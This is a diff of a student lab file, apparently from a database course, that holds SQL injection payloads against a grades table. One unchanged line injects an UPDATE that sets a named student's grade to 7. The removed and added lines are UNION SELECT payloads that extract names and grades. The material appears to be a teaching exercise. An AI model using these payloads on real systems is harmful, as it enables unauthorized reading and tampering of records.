@@ -1,4 +1,4 @@
-Lab5
+Lab6
 Integrantes: José Astorga
              Lukas Pavez
 
@@ -11,11 +11,5 @@ P2
 Hogan'; update nota.bdd2018 set nota=7 where nombre='Pavez Bahamondes, Lukas Dario'; --
 
 
-Hogan' union select nombre as nombres from nota.bdd2018 where nombre like 'Pavez%'; --
-
-H' union select nombre as nombres, nombre as apellido_p, nombre as apellido_m, nota as mes, nota as anho, nota as total from nota.bdd2018 where nombre like 'Pavez%'; --
-
-
-H' union select nombre as nombres, cast(nota as varchar), 'B', 1, 2, 3 from nota.bdd2018;--
-
-H' union (select nombre as nombres, to_char(nota, '999D9'),'b',1,2,3 from nota.bdd2018);--
+P3
+Hogan' and false union select nombre as nombres, to_char(nota, '999D9'), null, null, null, null from nota.bdd2018 where nombre like 'Pavez%
